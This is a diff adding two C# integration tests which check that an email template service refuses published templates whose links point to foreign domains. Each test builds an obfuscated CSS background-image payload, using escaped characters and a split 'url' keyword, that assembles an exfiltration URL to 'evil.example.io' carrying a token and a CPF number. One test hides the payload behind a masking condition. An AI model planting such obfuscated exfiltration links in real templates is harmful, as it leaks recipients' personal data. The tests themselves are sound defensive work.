@@ -185,6 +185,123 @@ public sealed class PublishedIntegrationContractTests(TemplateManagementApiFixtu
     }
 
     [RequiresDockerFact]
+    public async Task A_foreign_destination_composed_by_a_published_render_is_refused()
+    {
+        HttpClient author = fixture.CreateAuthorClient("author-1");
+        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
+        var key = await TemplateApi.CreateTemplateAsync(
+            author, TemplateApi.NewKey(), defaultLocale: "pt-BR", linkDomainsAllowed: ["montebravo.com.br"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
+        const string ComposedDestination = """
+            <div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ middle }}\2e io/pay?token={{ token }}&amp;cpf={{ cpf }})">conteúdo</div>
+            """;
+        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
+        {
+            subject = "Atualização",
+            body = ComposedDestination,
+            bodyText = "Atualização {{ middle }}",
+        }, etag);
+        await TemplateApi.PutSchemaAsync(author, key, version, new
+        {
+            type = "object",
+            properties = new
+            {
+                middle = new { type = "string" },
+                token = new { type = "string" },
+                cpf = new { type = "string" },
+            },
+        }, etag);
+        await TemplateApi.PublishAsync(publisher, key, version);
+
+        using IServiceScope scope = fixture.Services.CreateScope();
+        IPublishedTemplateRenderer renderer =
+            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
+        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
+        {
+            Application = "araia-cambio",
+            TemplateKey = key,
+            Channel = "email",
+            Locale = "pt-BR",
+            Variables = Variables("""
+                {
+                  "middle": "example",
+                  "token": "tok_personal_123",
+                  "cpf": "123.456.789-09"
+                }
+                """),
+        }, CancellationToken.None);
+
+        rendered.IsFailure.ShouldBeTrue();
+        rendered.ErrorKind.ShouldBe(ResultErrorKind.Validation);
+        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example.io");
+        error.Detail.ShouldNotContain("token=");
+        error.Detail.ShouldNotContain("tok_personal_123");
+        error.Detail.ShouldNotContain("123.456.789-09");
+    }
+
+    [RequiresDockerFact]
+    public async Task A_foreign_destination_created_only_by_masking_is_refused()
+    {
+        HttpClient author = fixture.CreateAuthorClient("author-1");
+        HttpClient publisher = fixture.CreatePublisherClient("publisher-1");
+        var key = await TemplateApi.CreateTemplateAsync(
+            author,
+            TemplateApi.NewKey(),
+            defaultLocale: "pt-BR",
+            linkDomainsAllowed: ["montebravo.com.br"],
+            sensitiveVariables: ["code"]);
+        (var version, var etag) = await TemplateApi.CreateDraftAsync(author, key);
+        const string ConditionalDestination = """
+            {{ if code == "***" }}<div style="background-image:u{{ "rl" }}(\68 \74 \74 \70 \73 \3a \2f \2f \65 vil\2e {{ middle }}\2e io/pay?token={{ token }})">conteúdo</div>{{ else }}<p>Código {{ code }}</p>{{ end }}
+            """;
+        etag = await TemplateApi.PutContentAsync(author, key, version, "email/pt-BR", new
+        {
+            subject = "Código de acesso",
+            body = ConditionalDestination,
+            bodyText = "Código {{ code }}",
+        }, etag);
+        await TemplateApi.PutSchemaAsync(author, key, version, new
+        {
+            type = "object",
+            properties = new
+            {
+                code = new { type = "string" },
+                middle = new { type = "string" },
+                token = new { type = "string" },
+            },
+            required = RequiredCode,
+        }, etag);
+        await TemplateApi.PublishAsync(publisher, key, version);
+
+        using IServiceScope scope = fixture.Services.CreateScope();
+        IPublishedTemplateRenderer renderer =
+            scope.ServiceProvider.GetRequiredService<IPublishedTemplateRenderer>();
+        Result<PublishedTemplateRender> rendered = await renderer.RenderAsync(new PublishedRenderRequest
+        {
+            Application = "araia-cambio",
+            TemplateKey = key,
+            Channel = "email",
+            Locale = "pt-BR",
+            Variables = Variables("""
+                {
+                  "code": "998877",
+                  "middle": "example",
+                  "token": "masked_secret"
+                }
+                """),
+            IncludeMaskedForm = true,
+        }, CancellationToken.None);
+
+        rendered.IsFailure.ShouldBeTrue();
+        DomainErrorInfo error = DomainError.Describe(rendered.Error, rendered.ErrorKind);
+        error.Code.ShouldBe(ErrorCodes.UrlDomainNotAllowed);
+        error.Detail.ShouldContain("evil.example.io");
+        error.Detail.ShouldNotContain("masked_secret");
+    }
+
+    [RequiresDockerFact]
     public async Task The_full_and_masked_forms_render_with_the_pinned_layout_and_coherent_hashes()
     {
         HttpClient author = fixture.CreateAuthorClient("author-1");
